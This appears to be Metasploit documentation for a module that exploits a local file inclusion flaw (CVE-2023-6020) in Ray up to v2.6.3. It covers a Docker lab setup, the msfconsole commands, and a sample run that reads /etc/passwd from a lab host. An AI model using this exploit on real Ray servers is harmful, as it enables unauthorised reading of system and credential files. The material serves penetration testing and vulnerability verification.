## Vulnerable Application

Ray (<=v2.6.3) is vulnerable to local file inclusion (CVE-2023-6020)

The vulnerability affects:

    * Ray (<=v2.6.3)

This module was successfully tested on:

    * Ray (v2.6.3) installed with Docker on Kali Linux 6.6.15

### Install and run the vulnerable Ray (v2.6.3)

1. Install your favorite virtualization engine (VirtualBox or VMware) on your preferred platform.
2. Install Kali Linux (or other Linux distro) in your virtualization engine.
3. Pull pre-built Ray docker container (v2.6.3) in your VM.
   `docker pull rayproject/ray:2.6.3`
4. Start the ray container.
   `docker run --shm-size=512M -it -p 8265:8265 rayproject/ray:2.6.3`
5. Start ray.
   `ray start --head --dashboard-host=0.0.0.0`

## Verification Steps

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/gather/ray_lfi_cve_2023_6020`
4. Do: `set rhost <rhost>`
5. Do: `run`
6. You should get a file content

## Options

### FILEPATH (Required)

This is the file to read. Default is `/etc/passwd`.

## Scenarios

### Ray (v2.6.3) installed with Docker on Kali Linux 6.6.15
```
msf6 > use auxiliary/gather/ray_lfi_cve_2023_6020
msf6 auxiliary(gather/ray_lfi_cve_2023_6020) > set rhost 192.168.56.6
rhost => 192.168.56.6
msf6 auxiliary(gather/ray_lfi_cve_2023_6020) > check
[+] 192.168.56.6:8265 - The target is vulnerable.
msf6 auxiliary(gather/ray_lfi_cve_2023_6020) > run
[*] Running module against 192.168.56.6

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[+] /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
ray:x:1000:100::/home/ray:/bin/bash

[*] Auxiliary module execution completed
```
